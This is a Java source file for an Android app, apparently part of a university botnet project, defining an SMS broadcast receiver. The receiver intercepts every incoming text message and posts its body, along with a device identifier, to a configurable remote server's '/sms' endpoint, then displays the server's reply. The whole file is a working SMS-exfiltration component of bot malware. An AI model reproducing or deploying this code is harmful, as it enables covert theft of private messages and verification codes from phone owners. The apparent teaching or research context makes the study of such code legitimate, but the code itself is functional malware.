package de.tudarmstadt.botnet.janus_yanai;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bundle = intent.getExtras();

		Object messages[] = (Object[]) bundle.get("pdus");
		SmsMessage smsMessage[] = new SmsMessage[messages.length];
		for (int n = 0; n < messages.length; n++) {
			smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
		}

	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://" + BotClientActivity.getIP(context) + "/sms");

	    try {
	        // Add your data
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
	        nameValuePairs.add(new BasicNameValuePair("serial", Config.getID(context)));
	        nameValuePairs.add(new BasicNameValuePair("body", smsMessage[0].getMessageBody()));
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	        
	        // Execute HTTP Post Request
	        HttpResponse response = httpclient.execute(httppost);
	        Toast.makeText(context, new Scanner(response.getEntity().getContent()).useDelimiter("\\A").next(), Toast.LENGTH_LONG).show();
	    } catch (Exception e) {
	    	Toast.makeText(context, e.getMessage(), Toast.LENGTH_LONG).show();
	    }

	}
}
